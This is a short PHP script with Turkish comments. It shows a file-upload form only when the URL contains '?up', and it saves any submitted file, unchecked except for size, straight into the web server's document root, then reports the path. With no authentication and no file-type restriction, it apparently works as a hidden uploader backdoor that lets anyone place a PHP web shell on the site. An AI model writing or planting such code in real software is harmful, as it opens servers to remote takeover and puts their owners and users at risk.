<?php
// Dosya yükleme işlemini gerçekleştiren fonksiyon
function upload_file_to_root() {
    // Yüklenen dosyanın geçici dizini ve hedef dizin (ana dizin)
    $target_dir = $_SERVER['DOCUMENT_ROOT'] . "/";
    $target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
    $uploadOk = 1;

    // Dosya boyutunu kontrol et (örneğin 50MB ile sınırlama)
    if ($_FILES["fileToUpload"]["size"] > 50000000) {
        echo "Dosya çok büyük. Maksimum izin verilen boyut 50MB.";
        $uploadOk = 0;
    }

    // Yükleme işlemi
    if ($uploadOk == 1) {
        if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
            echo "Dosya başarıyla yüklendi: " . htmlspecialchars(basename($_FILES["fileToUpload"]["name"])) . "<br>";
            echo "Dosyanın yüklendiği tam yol: " . $target_file;
        } else {
            echo "Dosya yüklenirken bir hata oluştu.";
        }
    }
}

// URL'de ?up parametresi olup olmadığını kontrol et
if (isset($_GET['up'])) {
    // Eğer form gönderildiyse, dosya yükleme işlemini başlat
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        upload_file_to_root();
    }
    ?>
    <!-- Dosya yükleme formu -->
    <form action="?up" method="post" enctype="multipart/form-data">
        Dosya seç:
        <input type="file" name="fileToUpload" id="fileToUpload">
        <input type="submit" value="Dosya Yükle" name="submit">
    </form>
    <?php
} else {
    echo "URL'de 'up' parametresi bulunamadı. Dosya yükleme formu görünmeyecek.";
}
?>
